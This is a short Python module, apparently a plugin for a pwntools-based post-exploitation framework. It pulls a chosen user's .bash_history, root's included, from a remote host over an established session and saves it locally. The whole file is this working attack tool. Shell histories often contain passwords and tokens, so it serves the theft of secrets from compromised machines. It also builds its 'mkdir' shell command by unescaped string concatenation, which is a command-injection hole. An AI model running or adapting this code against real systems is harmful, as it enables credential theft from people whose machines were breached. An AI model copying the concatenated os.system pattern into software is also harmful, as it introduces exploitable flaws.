#!/usr/bin/python3

from pwn import *
import misc.coloredstatus as cs
from time import sleep
import os

def execute(session, configs, params):
   
    def download(remote, local):
        try:
            session.download_file(remote, download_dir + local)
        except PermissionError:
            pass

    # Option to download another user's bash_history from machine
    user = params if params else session.user

    download_dir = configs["DownloadDirectory"] + session.host + "/"
    os.system("mkdir -p " + download_dir)
    remote_home_dir = "/home/" + user + "/" if user != "root" else "/root/" 
    
    try:
        download(remote_home_dir + ".bash_history", user + "_bash_hist") 
        return 0
    except:
        return 2
